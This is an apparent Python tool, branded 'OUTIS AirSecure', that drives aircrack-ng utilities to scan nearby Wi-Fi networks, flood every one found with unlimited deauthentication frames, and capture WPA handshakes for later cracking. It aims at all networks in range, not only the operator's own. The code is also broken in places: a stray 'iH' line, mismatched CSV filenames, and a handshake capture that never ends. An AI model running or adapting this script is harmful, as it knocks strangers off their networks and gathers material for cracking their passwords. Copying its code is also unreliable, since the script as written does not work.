import os
import subprocess
import time
from tqdm import tqdm
from threading import Thread


# Print a message indicating the start of the program
print("pls wait.....")

# Print a welcome message
print("""
  ****************************************
  *            OUTIS AirSecure           *
  *                                      *
  *  https://github.com/josephgeorge26   *
  ****************************************
""")

def get_wifi_interface():
    try:
        cmd = """iw dev | awk '$1=="Interface"{print $2}'"""
        with open(".wiface.txt", "w") as file:
            subprocess.run(cmd, shell=True, stdout=file, stderr=subprocess.DEVNULL)
        
        with open(".wiface.txt", "r") as file:
            interfaces = [line.strip() for line in file.readlines()]
        
        if interfaces:
            return interfaces[0]
        else:
            return None
    except Exception as e:
        print("Error:", e)
        return None

def put_interface_into_monitor_mode(interface):
    if "mon" in interface:
        print("Interface is already in monitor mode.")
        return interface
    
    try:
        subprocess.run(["sudo", "airmon-ng", "start", interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        print("Interface", interface, "is in monitor mode...")
        return interface + "mon"
    except Exception as e:
        print("Error:", e)
        return None

def scan_networks(interface):
    try:
        with open("scan_results-01.csv", "a") as output_file:
            process = subprocess.Popen(["airodump-ng", "--output-format", "csv", "-w", "-", interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            print("Scanning for networks...")

            def async_output_reader(stream):
                while True:
                    line = stream.readline().decode("utf-8")
                    if not line:
                        break
                    # Comment out this print statement to suppress output on the screen
                    # print(line, end='')

            Thread(target=async_output_reader, args=(process.stdout,), daemon=True).start()
            Thread(target=async_output_reader, args=(process.stderr,), daemon=True).start()

            for _ in tqdm(range(20), desc="Scanning Progress", unit="sec"):
                time.sleep(1)

            process.terminate()
            process.wait()

        print("Scan complete.")
    except Exception as e:
        print("Error:", e)

def deauth_all(interface):
    try:
        with open("--01.csv", "r") as file:
            lines = file.readlines()
        
        networks = []
        for line in lines[2:]:
            parts = line.strip().split(",")
            if len(parts) >= 14:
                bssid = parts[0].strip()
                essid = parts[13].strip()
                if essid:
                    networks.append((essid, bssid))
        
        for essid, bssid in networks:
            print(f"Deauthenticating {essid} ({bssid})")
            try:
                os.system(f"sudo timeout 5s aireplay-ng -D --deauth 0  --ignore-negative-one  -a  {bssid} {str(get_wifi_interface())} > /dev/null &")
                capture_handshake(interface, essid, bssid)  # Pass bssid to capture_handshake
                print("Deauthentication command successful.")
                time.sleep(1)
            except subprocess.CalledProcessError as e:
                print(f"Error deauthenticating {essid} ({bssid}): {e}")
    except Exception as e:
        print("Error:", e)

def capture_handshake(interface, essid, bssid):
    try:
        print(f"Capturing handshake for {essid} ({bssid})...")
        if not os.path.exists("captured_handshakes"):
            os.makedirs("captured_handshakes")
        filename = f"captured_handshakes/{essid}-{bssid}.cap"
        hand = subprocess.run(["sudo", "airodump-ng", "--write", filename, "-c", "1", "--bssid", bssid, interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        iH
        print("Handshake captured.")
    except Exception as e:
        print("Error:", e)

def exiting(interface):
    try:
        subprocess.run(["sudo",  "timeout", "20s", "airmon-ng", "stop", interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
    except Exception as e:
        print("Error:", e)

def main():
    interface = get_wifi_interface()
    if interface:
        monitor_interface = put_interface_into_monitor_mode(interface)
        if monitor_interface:
            scan_networks(monitor_interface)
            deauth_all(monitor_interface)
#            with open("scan_results-01.csv", "r") as file:
 #               lines = file.readlines()
  #              for line in lines[2:]:
   #                 parts = line.strip().split(",")
    #                if len(parts) >= 14:
     #                   bssid = parts[0].strip()
      #                  essid = parts[13].strip()
       #                 if essid:
        #                    capture_handshake(monitor_interface, essid, bssid)
            exiting(monitor_interface)
    else:
        print("Could not find wireless interface.")

if __name__ == "__main__":
    main()
